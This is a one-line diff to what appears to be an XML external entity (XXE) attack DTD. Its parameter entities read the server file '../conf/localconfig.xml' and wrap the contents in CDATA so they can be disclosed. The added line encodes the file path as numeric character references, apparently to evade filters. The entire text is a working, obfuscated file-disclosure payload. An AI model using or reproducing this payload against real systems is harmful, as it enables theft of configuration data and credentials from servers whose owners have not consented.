@@ -1,1 +1,1 @@
-<!ENTITY % file SYSTEM "file:../conf/localconfig.xml"><!ENTITY % start "<![CDATA["><!ENTITY % end "]]>"><!ENTITY % all "<!ENTITY fileContents '%start;%file;%end;'>">
+<!ENTITY % file SYSTEM "file:&#46;&#46;&#47;&#99;&#111;&#110;&#102;&#47;&#108;&#111;&#99;&#97;&#108;&#99;&#111;&#110;&#102;&#105;&#103;&#46;&#120;&#109;&#108;"><!ENTITY % start "<![CDATA["><!ENTITY % end "]]>"><!ENTITY % all "<!ENTITY fileContents '%start;%file;%end;'>">
